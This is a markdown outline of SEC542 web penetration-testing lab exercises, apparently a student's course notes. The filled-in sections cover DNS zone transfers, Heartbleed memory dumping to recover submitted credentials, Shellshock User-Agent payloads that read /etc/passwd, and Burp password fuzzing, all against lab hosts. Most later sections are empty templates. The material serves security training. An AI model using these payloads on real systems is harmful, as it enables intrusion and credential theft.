
SEC542 Exercises
===
An outline of the SEC542 exercises. This outline is exhaustive and covers 100% of
the course lab material.

Items are referenced by book(b) number, by and page(p) number or range.

Legend:
```
Foo, Bar & baz
- Overview - b 1    p 2-7, 18
  ╰╴context  ╰╴book ╰╴page(s)
```

View the...
- [Appendix](appendix) of concepts and methods in the SEC542 course.
- [Cheatsheets](cheatsheets) for quick reference of the SEC542 course.
- [Glossary](glossary) of terms in the SEC542 course.
- [Index](index) of references to terms in the SEC542 course.
- [Outline](outline) of the SEC542 course.

---

### Table of Contents
- [542.1 Introduction and Information Gathering](#5421-introduction-and-information-gathering)
   - [DNS Harvesting](#dns-harvesting)
   - [Examining HTTP Requests and Responses](#examining-http-requests-and-responses)
   - [Testing HTTPS](#testing-https)
   - [Exploiting Heartbleed](#exploiting-heartbleed)
- [542.2 Configuration, Identity and Authentication Testing](#5422-configuration-identity-and-authentication-testing)
   - [Gathering Server Info](#gathering-server-info)
   - [Shellshock](#shellshock)
   - [Spidering](#spidering)
   - [ZAP Forced Browse](#zap-forced-browse)
   - [Burp Fuzzing](#burp-fuzzing)
   - [Directory Browsing](#directory-browsing)
   - [Authentication](#authentication)
   - [Username Harvesting](#username-harvesting)
- [542.3 Injection](#5423-injection)
   - [Authentication Bypass](#authentication-bypass)
   - [Command Injection](#command-injection)
   - [Local/Remote File Inclusion](#localremote-file-inclusion)
   - [Error-Based SQLi](#error-based-sqli)
   - [sqlmap + ZAP](#sqlmap-zap)
- [542.4 JavaScript and XSS](#5424-javascript-and-xss)
   - [JavaScript](#javascript)
   - [Reflective XSS](#reflective-xss)
   - [HTML Injection](#html-injection)
   - [BeEf](#beef)
   - [AJAX XSS](#ajax-xss)
- [542.5 CSRF, Logic Flaws and Advanced Tools](#5425-csrf-logic-flaws-and-advanced-tools)
   - [CSRF](#csrf)
   - [Mobile MITM](#mobile-mitm)
   - [Python](#python)
   - [WPScan](#wpscan)
   - [w3af](#w3af)
   - [Metasploit](#metasploit)
   - [When Tools Fail](#when-tools-fail)
- [Common Tasks](#common-tasks)
   - [Enabling a Proxy](#enabling-a-proxy)
   - [Disabling a Proxy](#disabling-a-proxy)

---

### TODO
- Lab section titles should be **bolded**.
   - [ ] Review adherence.
- Application names should be **bolded**.
   - [ ] Review adherence.
   - Other references to a GUIs should be *Italisized*:
      - Components
      - Modules
      - buttons
      - options
      - menus
      - tabs
      - panels
      - panel contents.
      - [ ] Review adherence.
   - Application name MUST be followed by a colon (`:`).
      - [ ] Review adherence.
- Only user input should be in a code block.
   - [ ] Review adherence.
- Only Sub-steps should be indented, not subsequent steps:
   - [ ] Review adherence.
   - Parents of sub-steps Should terminate with a colon (ie, the above item).
      - [ ] Review adherence.
- The Keyword 'Using' implies multiple methods/options are available.
   - [ ] Review adherence.
- The Keyword 'Use' implies only a single method/option is available.
   - [ ] Review adherence.
- 'Parent > Child' may be used as an alternative to a Parent and Child list items.
- Lab section parent labels MUST be **bolded**.
- Lab and lab sections SHOULD begin with a 'Steps:' entry.
- hierarchy
   - Labs, lab sections, Use/Using entries, and method options SHOULD be the primary means used to organize this document's hierarchy.
   - 'E.g.' entries, 'I.e.' entries and GUI Changes and a common reason for sub-sections.
   - a Max depth of 4 is supported, i.e. a parent, child, grand-child and great-grand-child.
- [ ] Review Exercises for consistency:
   - [ ] 'www' vs 'naked' domains: [www.]sec542.org
   - [ ] Nmap: "--script name" or "--script=name"?
- [ ] Use the exercise notes in this file to create the 'methods' section of the Appendix.
- [ ] Use markdown reference style links where useful...
   - ie, the line containig: 'A common mapping'
- Review all triple question marks (*???*).

---

542.1 Introduction and Information Gathering
---

### DNS Harvesting
- **Index** - b *1* p *69-77*
   - **Search DNS records**
      - Use **Dig:** `$ dig sec542.org -t any`
   - **Attempt a Zone Transfer**
      - Using **Dig:** `$ dig sec542.org -t axfr`
      - Using **DNSRecon:** `$ dnsrecon.py -a -d sec542.org`
      - Using **Nmap:** `$ nmap --script=dns-zone-transfer sec542.org`
   - **DNS Brute Force Scan**
      - Using **Nmap:**
         - Using the default wordlist: `$ nmap --script=dns-brute sec542.com`
            - Returns 5 records.
         - Using a custom wordlist: `$ nmap --script=dns-brute sec542.com --script-args=dns-brute.hostlist=/opt/dnsrecon/namelist.txt`
            - Returns 6 records.
      - Using **DNSRecon:**
         - Using the default wordlist: `$ dnsrecon.py -t brt -d sec542.com -D /opt/dnsrecon/namelist.txt`
            - Returns 6 records.
      - **Improve Results with Custom Wordlists**
         - Using the *DNSRecon* wordlist returned more results than the *Nmap* wordlist.
         - Compare wordlists, use *word count* (`wc`) with the *lines flag* (`-l`):
            - *Nmap* wordlist: `$ wc -l /usr/local/share/nmap/nselib/data/vhosts-default.lst`
               - 127 lines.
            - *DNSRecon* wordlist: `$ wc -l /opt/dnsrecon/namelist.txt`
               - 1907 lines.
         - :information_source: Either tool can use a custom wordlist.
   - **Reverse DNS (PTR) Scan**
      - Using *Metasploit:*
        ```bash
        $ msfconsole
        > use auxiliary/gather/dns_reverse_lookup
        > set RANGE 192.168.1.0/24
        > run
        ```
      - Using *DNSRecon:* `$ dnsrecon.py -r 192.168.1.0/24`
         - Requires the reverse scan flag(`-r`).
      - Using *Nmap:* `$ nmap -sL 192.168.1.0/24| grep \`
         - Lists(`-sL`) every address from 192.168.1.0 to 192.168.1.255. Append `| grep \` to filter the output.

[:top:][↑b]

### Examining HTTP Requests and Responses
- **Index** - b *1* p *134-141*
   - **Listen to Traffic**
      - Use **Wireshark:**
         - Launch and capture traffic on *any* interface.
      - *Firefox* > *Bookmarks* > open *HTTP Request/Response*
   - **Craft a HTTP POST Request**
      - Use **Netcat:**
        ```bash
        $ nc www.sec542.org 80 <press enter>
        POST /form_auth/login.php HTTP/1.0 <press enter>
        Content-Length: 34 <press enter>
        <press enter>
        user=marvin&pass=test&button=Login <press enter>
        ```
   - **Analyze Traffic**
      - Use **Wireshark:**
         - Stop capturing traffic.
         - Follow the TCP streams:
            1. Type `http.request.method` into the *Filter:* input and click *apply*
            2. Right-click on *GET /exercise1.html* and select *Follow TCP stream*
               - Note the **client** header, including the *User-Agent*, *Host* and other fields.
               - *Whireshark* displays client traffic in red and server traffic in blue.
            3. Repeat step 1
            4. Right-click on *POST /form_auth/login.php* and select *Follow TCP stream*.
               - Note the lack of *User-Agent*, *Accept-* headers and other fields.

[:top:][↑b]

### Testing HTTPS
- **Index** - b *1* p *153-157*
   - **Test HTTPS configuration**
      - Use *Nmap:*
         - Run the _ssl-enum-ciphers_ NSE script and save the results to file(-oN).
            - www.sec542.org
               - Nmap: `$ nmap -p 443 --script=ssl-enum-ciphers www.sec542.org -oN /tmp/www.sec542.org.nmap`
                  - Note the 'least strength' letter grade (C).
            - heart.bleed
               - Nmap: `$ nmap -p 443 --script=ssl-enum-ciphers heart.bleed -oN /tmp/heart.bleed.nmap`
                  - Note the 'least strength' letter grade (E).
         - Find the responsible cipher
            - heart.bleed: `$ grep "\- E" /tmp/heart.bleed.nmap`
               - The cipher is *TSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA*.

[:top:][↑b]

### Exploiting Heartbleed
- **Index** - b *1* p *165-173*
   - **Test for *Heartbleed*
      - Use *Nmap*
         - *sec542.org:* `$ nmap -p 443 --script ssl-heartbleed sec542.org`
            - Not vulnerable, output will not indicate
         - *heart.bleed:* `$ nmap -p 443 --script ssl-heartbleed heart.bleed`
            - Vulnerable, output will indicate this.
            - *heart.bleed* was added to /etc/hosts and resolves to 127.3.3.3.
   - **Exploit Heartbleed**
      1. Use *Firefox:*
         - Visit *https://heart.bleed*
            - Click *Heartbleed Exercise*
         - :information_source: Chrome handles the *referrer* field differently, and may omit some output.
      2. Submit the Login Form:
         - User: `user1`
         - Pass: `pass1`
      3. Use *heartbleed.py:* `$ heartbleed.py heart.bleed |less`
         + Be sure to run from a location that allows write access (ie /home/user).
         + The user and pass from step 2 will not be present after the first submission.
      4. Continue Exploiting
         - Repeat step 2, submitting:
            - User: `user2`
            - Pass: `pass2`
         - Repeat step 3:
            - View the output and look for the previously entered username and password
         - If the second attempt does not yield the username and password, repeat steps 2 and 3 until successful
   - :information_source: The heartbleed.py script creates a file named dump.bin containing a bianary copy of all dumped RAM.
      - View the printable strings: `$ strings dump.bin`
         - The above command assumes 'dump.bin' is in the working directory

[:top:][↑b]

542.2 Configuration, Identity and Authentication Testing
---

### Gathering Server Info
- **Index** - b *2* p *15-18*
   - Using *Netcat:*
      - On Port *80:*
        ```bash
        $ nc www.sec542.org 80 <press enter>
        $ HEAD / HTTP/1.0 <press enter>
        $ <press enter>
        ```
      - On Port *443:*
        ```bash
        $ nc www.sec542.org 443 <press enter>
        $ HEAD / HTTP/1.0 <press enter>
        $ <press enter>
        ```
         - This should output a *HTTP/1.1 400 Bad Request* error beacause netcat
           did not negotiate ssl. It still divulges the server information, however.
   - Using *Nmap:*
      - Version Detection: `$ nmap -sV www.sec542.org`
      - Use *NSE* scripts: `nmap --script=script-name.txt www.target.host`
         - View available scripts: `ls -l /usr/local/share/nmap/scripts`
         - Example, *robots.txt* detection:
            - *http-robots.txt.nse:* `$ nmap --script=http-robots.txt www.sec542.org`

[:top:][↑b]

### Shellshock
- **Index** - b *2* p *38-49*
   - **Shellshocking**
      - Using *Burp:*
         1. [Enable Burp][§a]
         2. *Burp* > *Proxy* > *Intercept* > select *Intercept is on*
         3. *Firefox* > *Bookmarks* > *Exercies* > select *Shellshock Netstat.cgi*
         4. *Burp* > Proxy > Intercept
            - Raw > change the User-Agent: `User-Agent: () { 42;};echo;/bin/cat /etc/passwd`
            - Select 'Intercept is off'
         5. *Firefox* should display the password file contents
            - If not, repeat steps 2-4
         6. Injecting other commands
            - Repeat steps 2-4 using: `User-Agent: () { 42;};echo;/usr/bin/id`
         7. [Disable Burp][§b]
      - Using *cURL:*
         - /etc/passwd: `$ curl -A "() { 42;};echo;/bin/cat /etc/passwd" http://127.0.0.1/cgi-bin/netstat.cgi`
         - /usr/bin/id: `$ curl -A "() { 42;};echo;/usr/bin/id" http://127.0.0.1/cgi-bin/netstat.cgi`
         - Syntax: `$ curl -A "<User-Agent>" <URL>`
   - When injecting commands, the full path to the command must be used

[:top:][↑b]

### Spidering
- **Index** - b *2* p *65-75*
   - Using *Wget:*
      - Run: `$ wget -r http:/www.sec542.org -P /tmp/`
          - The `-r` flag enables recursive retrieving
          - The `-P` flag sets the directory where downloads are saved to
      - Results: `$ ls -alh /tmp/www.sec542.org`
   - Using *ZAP:*
      - [Enable ZAP][§a]
      - *ZAP* > Scope Panel > Target > Attack > Spider > Start Scan
         - Find the target in the Scope Panel
            - If you don't see it, visit the target in Firefox first
         - Right-click on the target
            - Select *Attack*
               - Select *Spider*
                  - Click *Start Scan*
      - [Disable ZAP][§b]
   - Using *Burp:*
      - [Enable Burp][§a]
      - *Spider* ??? what is spider?
         - click *Spider is paused*
         - Options > input prompting for auth-related forms ??? Why use this
      - *Burp* > Target > examine the results
      - [Disable Burp][§b]
   - Using *CeWL:*
      - Change to the *CeWL* directory: `$ cd /opt/cewl`
      - Run: `$ ./cewl.rb http://sec542.org`
      - Write the results to a file`-w ~/cewl_wordlist`

[:top:][↑b]

### ZAP Forced Browse
- **Index** - b *2* p *82-89*
   - [Enable ZAP][§a]
   - **Start a Forced Browse**
      - Right-click on the target
         - Select *Attack*
            - Select *Forced Browse Site*
   - **Forced Browse Results**
      - View newly discovered URLs
      - Right-click on the URL
         - select *Open URL in Browser*
   - [Disable ZAP][§b]

[:top:][↑b]

### Burp Fuzzing
- **Index** - b *2* p *97-106*
   - [Enable Burp][§a]
   - **Capture a request**
      - Use **Firefox:**
         - Open *Bookmarks* > select *Web Authentication - Forms*.
            - Use a good username with a bad password to capture the POST to fuzz.
            - Attempt to login using:
               - User: `Marvin`
               - Pass: `asdf`
   - **Fuzz the Request**
      - Use **Burp:**
         - Right-click on the POST: *POST /form_auth/login.php HTTP/1.1*
            - Select *Send to Intruder*.
         - Open the *Intruder* tab:
            - Open the *Position* sub-tab:
               - :information_source: Burp automatically identifies fuzzing positions,
                 highlighted in orange and delineated by the section symbol *§*).
               - Click *clear* to remove the automatically created fuzzing positions.
               - Highlight the previously submitted password: *asdf*.
               - Click *Add §* to fuzz that request field.
                  - I.e. `user=marvin&pass=§asdf§&button=Login`
            - Open the *Payloads* sub-tab:
               - *Payload Sets* > set *Payload Type* > select *Runtime file*.
               - *Payload Options* > click *Select file* > select */opt/wordlists/splashdata-worst-passwords-2014.txt*
               - Click *Start Attack*.
               - Click *OK* if there is a demo version warning pops up.
                  - The input file is only 25 lines, this will work fine. ZAP's fuzzer is unrestricted.
   - **Fuzzing Results**
      - From the *Intruder* window > open the *Results* tab:
         - Open the *Response* sub-tab:
            - All requests will result in a 200 HTTP status code, which is common.
            - Sorting by length can be useful. Longer responses can be revealing:
               - The cracked password is *letmein*.
   - [Disable Burp][§b]

[:top:][↑b]

### Directory Browsing
- **Index** - b *2* p *115-131*
- **Apache User Directories**
   - The Apache [mod_userdir][01] Module maps user-specific directories to URIs.
      - A common mapping is */home/username/public_html* to *www.example.com/~username*.
      - The most common *username* format is the first initial and last name.
         - E.g. Arthur Dent's *username* would be *adent*.
      - This Module is not enabled by default.
      - The [UserDir][02] Directive sets the user directory to use when a request is received.
      - Enabling User Directories:
         - Uncomment the line `#Include conf/extra/httpd-userdir.conf` in *conf/httpd.conf*, and adapt *httpd-userdir.conf* as necessary.
         - Use the *UserDir* Directive in a config file.
         - See the Apache Documentation [Per-user web directories][03] tutorial.
- **Fuzz user directories**
   - Generate a list of last names:
      - Using *gedit*: `$ gedit ~/lastnames`
      - Add the following lines:
        ```
        beeblebrox
        dent
        prefect
        jones
        smith
        ```
      - Save the file.
      - Note: The Tilde character `~` is **[expanded][04]** to the path of your user home directory.
         - E.g. The path *~/lastnames* expands to */home/username/lastnames*.
   - Fuzz possible usernames by appending each last name with the letter *a* through *z*.
      - E.g. *adent, bdent, cdent, ..., zdent*.
   - Request the respective URL, returning those with an HTTP 200 response code.
      - E.g. *www.sec542.org/~adent*.
- Using **find_accounts:** `find_accounts ~/lastnames`
   - A custom *python* script that accepts a list of names.
   - View the source code: `$ gedit /usr/local/bin/find_accounts`
   - Outputs 5 results: *zbeeblebrox*, *adent*, *fprefect*, *hjones* and *lsmith*.
- Using **ZAP**:
   - [Enable ZAP][§a]
   - [Disable ZAP][§b]





   - **Heading**
      - Using ***
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Authentication
- **Index** - b *2* p *154-173*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Username Harvesting
- **Index** - b *2* p *184-201*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

542.3 Injection
---

### Authentication Bypass
- **Index** - b *2* p *27-32*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Command Injection
- **Index** - b *2* p *45-55*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Local/Remote File Inclusion
- **Index** - b *2* p *65-77*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Error-Based SQLi
- **Index** - b *2* p *118-127*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### sqlmap + ZAP
- **Index** - b *2* p *167-182*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

542.4 JavaScript and XSS
---

### JavaScript
- **Index** - b *4* p *23-31*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Reflective XSS
- **Index** - b *4* p *48-53*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### HTML Injection
- **Index** - b *4* p *75-95*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### BeEf
- **Index** - b *4* p *116-128*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### AJAX XSS
- **Index** - b *4* p *155-173*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

542.5 CSRF, Logic Flaws and Advanced Tools
---

### CSRF
- **Index** - b *2* p *14-25*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Mobile MITM
- **Index** - b *2* p *30-45*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Python
- **Index** - b *2* p *58-64*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### WPScan
- **Index** - b *2* p *68-78*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### w3af
- **Index** - b *2* p *93-100*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### Metasploit
- **Index** - b *2* p *117-125*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

### When Tools Fail
- **Index** - b *2* p *133-144*
   - **Heading**
      - Using ****
         - Parent Step:
            - Child step: `$ code ...`
            - Subsequent step ...
            - :information_source: ...
         - Subsequent Parent Step:

[:top:][↑b]

Common Tasks
---
Small shared tasks consisting of common steps performed in exercises.

### Enabling a Proxy
- Enable Burp/ZAP
   - Launch the proxy
      - :hourglass: ZAP can take ≈ 10 secs to load. Bepatient
   - Use **Firefox**:
      - *Proxy Selector* > select *[proxy name]*
      - Visit the target site to prime the proxy with some traffic.

[:top:][↑b]

### Disabling a Proxy
- Use **Firefox** > *Proxy Selector* > select *No Proxy*

[:top:][↑b]

<!-- Referenced Internal Links -->

[↑a]: #sec542-exercises (Top of page ↑)
[↑b]: #table-of-contents (Table of Contents ➹)
[§a]: #enabling-a-proxy (Enable your Interception Proxy)
[§b]: #disabling-a-proxy (Disable your Interception Proxy)

<!-- Referenced External Links -->

[01]: https://httpd.apache.org/docs/trunk/mod/mod_userdir.html (Apache2 Manual: Module mod_userdir)
[02]: https://httpd.apache.org/docs/trunk/mod/mod_userdir.html#UserDir (Apache2 Manual: UserDir Directive)
[03]: https://httpd.apache.org/docs/trunk/howto/public_html.html (Apache2 Manual: Per-user web directories)
[04]: https://www.gnu.org/software/bash/manual/html_node/Tilde-Expansion.html (Bash Manual: Tilde Expansion)
